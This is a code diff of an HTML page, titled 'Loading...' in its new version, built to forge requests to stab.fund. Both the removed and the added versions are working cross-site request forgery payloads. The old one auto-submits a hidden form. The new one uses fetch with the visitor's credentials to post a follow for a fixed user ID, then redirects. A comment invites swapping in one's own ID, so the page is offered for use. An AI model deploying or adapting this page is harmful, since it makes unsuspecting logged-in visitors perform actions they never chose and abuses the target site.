@@ -1,16 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head><title>Redirecting...</title></head>
+<head><title>Loading...</title></head>
 <body>
-    <form id="csrfform" action="https://stab.fund/api/follow" method="POST">
-        <input type="hidden" name="userId" value="c07e3746-0e8a-4fcc-837f-baa3fd06bb4a">
-    </form>
-    <script>
-        document.getElementById('csrfform').submit();
-        // Redirect to stab.fund after short delay
-        setTimeout(function(){
-            window.location.href = 'https://stab.fund';
-        }, 500);
-    </script>
+<script>
+// Replace YOUR_USER_ID with your actual UUID from stab.fund
+const userId = 'c07e3746-0e8a-4fcc-837f-baa3fd06bb4a';
+fetch('https://stab.fund/api/follow', {
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: 'userId=' + encodeURIComponent(userId)
+})
+.then(() => { window.location.href = 'https://stab.fund'; })
+.catch(() => { window.location.href = 'https://stab.fund'; });
+</script>
 </body>
 </html>
